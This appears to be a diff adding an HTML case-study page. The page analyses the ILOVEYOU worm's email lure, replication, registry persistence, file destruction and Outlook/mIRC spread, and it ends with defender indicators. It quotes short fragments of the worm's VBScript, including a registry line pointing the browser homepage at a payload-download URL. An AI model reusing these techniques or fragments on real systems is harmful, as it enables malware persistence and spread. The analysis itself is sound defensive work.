@@ -1,0 +1,427 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="A static-analysis case study of the ILOVEYOU worm: its lure, execution flow, persistence, file infection, and propagation channels."
+    />
+    <meta name="theme-color" content="#080807" />
+    <title>ILOVEYOU — Anatomy of a Digital Love Letter</title>
+    <link rel="stylesheet" href="styles.css" />
+    <script src="script.js" defer></script>
+  </head>
+  <body class="intro-locked">
+    <section class="intro-gate" data-intro aria-label="Opening sequence">
+      <div class="intro-backdrop" aria-hidden="true"></div>
+      <div class="intro-scanlines" aria-hidden="true"></div>
+      <div class="intro-layout">
+        <div class="intro-copy">
+          <p>Incoming message / 05.04.2000</p>
+          <h2>Love arrives<br />before the warning.</h2>
+          <span>Opening case file…</span>
+        </div>
+        <figure class="intro-frame">
+          <img src="assets/intro-love.gif" alt="Animated vintage love message" />
+          <figcaption>Attachment preview / source supplied</figcaption>
+        </figure>
+      </div>
+      <div class="intro-controls">
+        <div class="intro-loader" aria-hidden="true"><span></span></div>
+        <button type="button" data-intro-skip>Enter the case</button>
+      </div>
+    </section>
+
+    <a class="skip-link" href="#case-study">Skip to case study</a>
+
+    <div class="page-progress" aria-hidden="true"><span></span></div>
+    <div class="infection-atmosphere" aria-hidden="true">
+      <span class="infection-vignette"></span>
+      <span class="infection-scan"></span>
+      <span class="infection-noise"></span>
+    </div>
+
+    <header class="site-header" data-header>
+      <a class="brand" href="#top" aria-label="Return to top">
+        <span class="brand-mark">ILY</span>
+        <span>Malware archive / case 05.2000</span>
+      </a>
+
+      <button class="menu-button" type="button" aria-expanded="false" aria-controls="site-nav">
+        <span>Explore case</span>
+        <i aria-hidden="true"></i>
+      </button>
+
+      <nav id="site-nav" class="site-nav" aria-label="Case study chapters">
+        <a href="#the-message">The message</a>
+        <a href="#execution">Execution</a>
+        <a href="#spread">Spread</a>
+        <a href="#findings">Findings</a>
+      </nav>
+    </header>
+
+    <main id="case-study">
+      <section class="hero" id="top" aria-labelledby="hero-title">
+        <div class="hero-photo" aria-hidden="true"></div>
+        <div class="hero-shade" aria-hidden="true"></div>
+        <div class="hero-word" aria-hidden="true">
+          <span>I LOVE</span>
+          <span>YOU</span>
+        </div>
+
+        <div class="hero-content">
+          <p class="hero-kicker">A malware case study</p>
+          <h1 id="hero-title">The love letter<br />that opened itself.</h1>
+          <p class="hero-deck">
+            One friendly sentence. One disguised attachment. A worm that turned trust,
+            address books, and shared files into its delivery system.
+          </p>
+        </div>
+
+        <div class="hero-meta" aria-label="Case metadata">
+          <div><span>Family</span><strong>LoveLetter</strong></div>
+          <div><span>Language</span><strong>VBScript</strong></div>
+          <div><span>Analysis</span><strong>Static only</strong></div>
+        </div>
+
+        <a class="scroll-cue" href="#the-message">
+          <span>Read the message</span>
+          <svg viewBox="0 0 24 36" aria-hidden="true">
+            <path d="M12 1v31M5 25l7 7 7-7" />
+          </svg>
+        </a>
+      </section>
+
+      <section class="opening section-light" id="the-message" data-chapter="The message">
+        <div class="section-number" aria-hidden="true">01</div>
+        <div class="opening-copy">
+          <p class="section-label">The message</p>
+          <h2>It did not look like malware.</h2>
+          <p class="lead">
+            It looked personal. The subject created urgency; the sentence sounded like it
+            came from someone you knew. The final disguise was a filename that appeared to
+            end in <code>.TXT</code> while actually ending in <code>.vbs</code>.
+          </p>
+          <p>
+            The sample then used Microsoft Outlook and MAPI to repeat the same invitation to
+            every contact it could reach. Social engineering was not a preface to the attack.
+            It was the engine.
+          </p>
+        </div>
+
+        <article class="mail-window" aria-label="Reconstruction of the malicious email">
+          <div class="mail-chrome">
+            <span></span><span></span><span></span>
+            <p>Inbox — Message</p>
+          </div>
+          <dl class="mail-fields">
+            <div><dt>From</dt><dd>Someone you know</dd></div>
+            <div><dt>Subject</dt><dd>ILOVEYOU</dd></div>
+          </dl>
+          <p class="mail-body">kindly check the attached LOVELETTER coming from me.</p>
+          <button class="attachment" type="button" data-attachment aria-describedby="attachment-note">
+            <span class="attachment-icon" aria-hidden="true">
+              <svg viewBox="0 0 40 48"><path d="M6 1h19l9 9v37H6z"/><path d="M25 1v10h9"/></svg>
+            </span>
+            <span><strong>LOVE-LETTER-FOR-YOU.TXT</strong><small>Visual Basic Script · 10 KB</small></span>
+            <span class="attachment-action">Inspect</span>
+          </button>
+          <p class="attachment-note" id="attachment-note" aria-live="polite">
+            Static reconstruction — the attachment cannot execute.
+          </p>
+        </article>
+      </section>
+
+      <section class="artifact-interlude" aria-label="The attachment as physical evidence" data-parallax>
+        <figure>
+          <img src="assets/loveletter-still-life.png" alt="A love letter and floppy disk on a dark office desk" />
+        </figure>
+        <div class="artifact-copy">
+          <p class="section-label">The disguise</p>
+          <blockquote>“A love letter” was only the visible filename.</blockquote>
+          <p>
+            Windows hid the final extension. What looked like a text document was executable
+            VBScript waiting for a double-click.
+          </p>
+          <span>LOVE-LETTER-FOR-YOU.TXT<strong>.vbs</strong></span>
+        </div>
+      </section>
+
+      <section class="sequence section-dark" id="execution" data-chapter="Execution">
+        <div class="sequence-intro">
+          <p class="section-label">Execution</p>
+          <h2>Four routines.<br />One chain reaction.</h2>
+          <p>
+            The script reads its own source into memory, then moves through a short, deliberate
+            sequence. The red thread follows the order found in <code>main()</code>.
+          </p>
+        </div>
+
+        <div class="sequence-track" aria-label="Malware execution sequence">
+          <div class="infection-thread" aria-hidden="true"><span></span></div>
+
+          <article class="sequence-step" data-step="1">
+            <div class="step-index">01</div>
+            <div>
+              <p class="step-call">Read itself</p>
+              <h3>Turn the script into a copyable payload.</h3>
+              <p>
+                <code>FileSystemObject</code> opens the running script and stores every line in
+                <code>vbscopy</code>. From this point, any writable file can become another copy.
+              </p>
+            </div>
+            <pre><code>vbscopy = file.ReadAll</code></pre>
+          </article>
+
+          <article class="sequence-step" data-step="2">
+            <div class="step-index">02</div>
+            <div>
+              <p class="step-call">Replicate</p>
+              <h3>Hide behind names that feel familiar.</h3>
+              <p>
+                Three copies land in Windows and System folders. Two imitate system components;
+                one preserves the love-letter disguise.
+              </p>
+            </div>
+            <ul class="file-stack" aria-label="Replicated files">
+              <li><span>SYS</span>MSKernel32.vbs</li>
+              <li><span>WIN</span>Win32DLL.vbs</li>
+              <li><span>SYS</span>LOVE-LETTER-FOR-YOU.TXT.vbs</li>
+            </ul>
+          </article>
+
+          <article class="sequence-step" data-step="3">
+            <div class="step-index">03</div>
+            <div>
+              <p class="step-call">Persist</p>
+              <h3>Return whenever Windows starts.</h3>
+              <p>
+                Two registry values point back to the dropped scripts. A third value stages the
+                secondary executable, <code>WIN-BUGSFIX.exe</code>.
+              </p>
+            </div>
+            <div class="registry-card">
+              <p>HKLM\…\Run\<strong>MSKernel32</strong></p>
+              <p>HKLM\…\RunServices\<strong>Win32DLL</strong></p>
+              <p>HKLM\…\Run\<strong>WIN-BUGSFIX</strong></p>
+            </div>
+          </article>
+
+          <article class="sequence-step" data-step="4">
+            <div class="step-index">04</div>
+            <div>
+              <p class="step-call">Multiply</p>
+              <h3>Use every available relationship.</h3>
+              <p>
+                Outlook contacts, local drives, shared drives, media files, script files, and
+                mIRC channels become parallel routes to the next victim.
+              </p>
+            </div>
+            <div class="route-pills" aria-label="Propagation routes">
+              <span>Outlook</span><span>Files</span><span>mIRC</span><span>HTML + ActiveX</span>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section class="network-interlude" aria-label="The infection spreads between computers" data-parallax>
+        <img src="assets/propagation-room.png" alt="Rows of vintage computers connected by a red infection path" />
+        <div class="network-overlay" aria-hidden="true"></div>
+        <div class="network-copy">
+          <p>One click became a network event.</p>
+          <div class="network-counter"><span data-counter>000</span><small>possible next recipients</small></div>
+        </div>
+        <div class="network-ticker" aria-hidden="true">
+          <span>OUTLOOK → WAB → MAPI → ATTACH → SEND → OUTLOOK → WAB → MAPI → ATTACH → SEND →</span>
+        </div>
+      </section>
+
+      <section class="spread section-paper" id="spread" data-chapter="Spread">
+        <div class="spread-heading">
+          <p class="section-label">Propagation map</p>
+          <h2>The victim became the sender.</h2>
+          <p>
+            Every route borrowed something trusted: a known contact, a familiar file, a shared
+            chat room, or a Windows-looking filename.
+          </p>
+        </div>
+
+        <div class="orbit" data-orbit>
+          <svg class="orbit-lines" viewBox="0 0 900 680" preserveAspectRatio="none" aria-hidden="true">
+            <path d="M450 340C330 235 248 195 125 145" />
+            <path d="M450 340C595 240 670 205 785 145" />
+            <path d="M450 340C330 440 235 500 110 540" />
+            <path d="M450 340C590 445 680 495 795 545" />
+          </svg>
+
+          <div class="orbit-core">
+            <span class="pulse" aria-hidden="true"></span>
+            <strong>LOVE-LETTER<br />FOR-YOU</strong>
+            <small>.TXT.vbs</small>
+          </div>
+
+          <article class="orbit-node node-mail">
+            <span>01</span><h3>Address book</h3>
+            <p>Outlook sends the attachment to every contact not already marked in WAB.</p>
+          </article>
+          <article class="orbit-node node-files">
+            <span>02</span><h3>Local files</h3>
+            <p>Scripts and images are overwritten; MP3 and MP2 files are hidden beside VBS copies.</p>
+          </article>
+          <article class="orbit-node node-irc">
+            <span>03</span><h3>mIRC</h3>
+            <p>A generated <code>script.ini</code> sends the HTML payload when another user joins.</p>
+          </article>
+          <article class="orbit-node node-web">
+            <span>04</span><h3>Browser</h3>
+            <p>The homepage points to <code>skyinet.net</code> paths serving the secondary payload.</p>
+          </article>
+        </div>
+      </section>
+
+      <section class="damage section-light" aria-labelledby="damage-title">
+        <div class="damage-title">
+          <p class="section-label">File behavior</p>
+          <h2 id="damage-title">The extension decided the damage.</h2>
+        </div>
+        <div class="extension-table" role="table" aria-label="File extension infection behavior">
+          <div class="extension-row table-head" role="row">
+            <span role="columnheader">Target</span><span role="columnheader">What the worm does</span><span role="columnheader">Result</span>
+          </div>
+          <div class="extension-row" role="row">
+            <span role="cell"><code>.vbs .vbe</code></span><span role="cell">Overwrites content with its own source</span><strong role="cell">Replaced</strong>
+          </div>
+          <div class="extension-row" role="row">
+            <span role="cell"><code>.js .jse .css .wsh .sct .hta</code></span><span role="cell">Overwrites, copies as VBS, deletes original</span><strong role="cell">Destroyed</strong>
+          </div>
+          <div class="extension-row" role="row">
+            <span role="cell"><code>.jpg .jpeg</code></span><span role="cell">Overwrites, appends VBS, deletes original</span><strong role="cell">Destroyed</strong>
+          </div>
+          <div class="extension-row" role="row">
+            <span role="cell"><code>.mp3 .mp2</code></span><span role="cell">Creates a VBS companion and hides the media</span><strong role="cell">Disguised</strong>
+          </div>
+        </div>
+      </section>
+
+      <section class="infection-break" id="infected" data-infected aria-labelledby="infected-title">
+        <div class="infection-image" aria-hidden="true"></div>
+        <div class="infection-crush" aria-hidden="true"></div>
+        <div class="infection-status">
+          <p><span></span> System status / irreversible changes detected</p>
+          <h2 id="infected-title" data-text="INFECTION CONFIRMED" aria-label="Infection confirmed">INFECTION<br />CONFIRMED</h2>
+          <div>
+            <span>Files overwritten</span>
+            <span>Contacts harvested</span>
+            <span>Persistence installed</span>
+          </div>
+        </div>
+        <p class="infected-scroll">Continue into the evidence <span>↓</span></p>
+      </section>
+
+      <section class="findings section-dark" id="findings" data-chapter="Findings">
+        <div class="findings-head">
+          <p class="section-label">Challenge findings</p>
+          <h2>Ten answers,<br />traced to the sample.</h2>
+          <p>Select any finding to reveal the evidence behind it.</p>
+        </div>
+
+        <div class="findings-list" data-accordion>
+          <details open>
+            <summary><span>01</span><strong>Email body</strong><em>kindly check the attached LOVELETTER coming from me.</em></summary>
+            <p><code>male.Body</code> assigns this exact sentence before Outlook sends the message.</p>
+            <pre class="evidence-line"><code>male.Body = vbcrlf &amp; "kindly check the attached LOVELETTER coming from me."</code></pre>
+          </details>
+          <details>
+            <summary><span>02</span><strong>Homepage domain</strong><em>http://www.skyinet.net</em></summary>
+            <p>All four candidate download paths written to Internet Explorer’s start page use this host.</p>
+            <pre class="evidence-line"><code>regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"</code></pre>
+          </details>
+          <details>
+            <summary><span>03</span><strong>Replication</strong><em>Three Windows locations</em></summary>
+            <p><code>MSKernel32.vbs</code> and <code>LOVE-LETTER-FOR-YOU.TXT.vbs</code> land in System; <code>Win32DLL.vbs</code> lands in Windows.</p>
+            <pre class="evidence-line"><code>c.Copy(dirsystem &amp; "\MSKernel32.vbs")
+c.Copy(dirwin &amp; "\Win32DLL.vbs")
+c.Copy(dirsystem &amp; "\LOVE-LETTER-FOR-YOU.TXT.vbs")</code></pre>
+          </details>
+          <details>
+            <summary><span>04</span><strong>Filesystem check</strong><em>WinFAT32.exe</em></summary>
+            <p>The filename is passed directly to <code>fileexist()</code>. In this sample, that helper returns <code>0</code> when a file exists and <code>1</code> otherwise.</p>
+            <pre class="evidence-line"><code>If (fileexist(dirsystem &amp; "\WinFAT32.exe") = 1) Then</code></pre>
+          </details>
+          <details>
+            <summary><span>05</span><strong>“m” extensions</strong><em>mp3, mp2</em></summary>
+            <p>The worm creates a matching <code>.vbs</code> file and applies the hidden attribute to the original media.</p>
+            <pre class="evidence-line"><code>ElseIf (ext = "mp3") Or (ext = "mp2") Then</code></pre>
+          </details>
+          <details>
+            <summary><span>06</span><strong>IRC artifact</strong><em>script.ini</em></summary>
+            <p>mIRC indicators trigger creation of a JOIN handler that distributes <code>LOVE-LETTER-FOR-YOU.HTM</code>.</p>
+            <pre class="evidence-line"><code>Set scriptini = fso.CreateTextFile(folderspec &amp; "\script.ini")</code></pre>
+          </details>
+          <details>
+            <summary><span>07</span><strong>Password stealer</strong><em>Barok</em></summary>
+            <p>The script header and generated HTML metadata identify the Barok/LOVELETTER lineage; the downloaded executable is named <code>WIN-BUGSFIX.exe</code>.</p>
+            <pre class="evidence-line"><code>rem  barok -loveletter(vbe) &lt;i hate go to school&gt;</code></pre>
+          </details>
+          <details>
+            <summary><span>08</span><strong>Email client</strong><em>Outlook</em></summary>
+            <p>The code instantiates <code>Outlook.Application</code> and obtains the <code>MAPI</code> namespace.</p>
+            <pre class="evidence-line"><code>Set out = WScript.CreateObject("Outlook.Application")</code></pre>
+          </details>
+          <details>
+            <summary><span>09</span><strong>Contact registry</strong><em>HKCU\Software\Microsoft\WAB\</em></summary>
+            <p>Per-list and per-contact state is stored beneath the Windows Address Book registry path.</p>
+            <pre class="evidence-line"><code>regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" &amp; a)</code></pre>
+          </details>
+          <details>
+            <summary><span>10</span><strong>Already sent value</strong><em>1</em></summary>
+            <p>After sending, the worm writes a <code>REG_DWORD</code> value of <code>1</code> for that contact.</p>
+            <pre class="evidence-line"><code>regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &amp; malead, 1, "REG_DWORD"</code></pre>
+          </details>
+        </div>
+      </section>
+
+      <section class="ioc-section section-red" aria-labelledby="ioc-title">
+        <div class="ioc-intro">
+          <p class="section-label">Defender’s appendix</p>
+          <h2 id="ioc-title">Leave with the evidence.</h2>
+          <p>Compact indicators extracted from the supplied sample. Copy them for a report or lab notes.</p>
+          <button class="copy-button" type="button" data-copy-iocs>
+            <span>Copy all indicators</span><i aria-hidden="true"></i>
+          </button>
+          <p class="copy-status" aria-live="polite"></p>
+        </div>
+
+        <div class="ioc-grid" data-iocs>
+          <article><h3>Files</h3><p>MSKernel32.vbs</p><p>Win32DLL.vbs</p><p>LOVE-LETTER-FOR-YOU.TXT.vbs</p><p>LOVE-LETTER-FOR-YOU.HTM</p><p>WIN-BUGSFIX.exe</p><p>script.ini</p></article>
+          <article><h3>Registry</h3><p>HKLM\…\Run\MSKernel32</p><p>HKLM\…\RunServices\Win32DLL</p><p>HKLM\…\Run\WIN-BUGSFIX</p><p>HKCU\Software\Microsoft\WAB\</p></article>
+          <article><h3>Network + mail</h3><p>www.skyinet.net</p><p>Subject: ILOVEYOU</p><p>Attachment: LOVE-LETTER-FOR-YOU.TXT.vbs</p></article>
+        </div>
+      </section>
+
+      <section class="conclusion section-paper" aria-labelledby="conclusion-title">
+        <p class="closing-mark" aria-hidden="true">I ♥ U</p>
+        <div>
+          <p class="section-label">Conclusion</p>
+          <h2 id="conclusion-title">The code was simple.<br />The context made it powerful.</h2>
+          <p class="lead">
+            ILOVEYOU succeeded by turning ordinary trust into infrastructure. A familiar sender
+            delivered the lure. Familiar filenames hid the payload. Familiar software carried it
+            onward. The worm did not need a sophisticated exploit when human curiosity could start
+            the chain.
+          </p>
+        </div>
+      </section>
+    </main>
+
+    <footer class="site-footer">
+      <p>Static analysis only. The supplied script was read as text and never executed.</p>
+      <div>
+        <a href="https://nob.cs.ucdavis.edu/classes/ecs153-2011-02/handouts/iloveyou.pdf" target="_blank" rel="noreferrer">CERT analysis</a>
+        <a href="https://threats.kaspersky.com/en/threat/Email-Worm.VBS.LoveLetter/" target="_blank" rel="noreferrer">Kaspersky archive</a>
+        <a href="#top">Back to top</a>
+      </div>
+    </footer>
+  </body>
+</html>
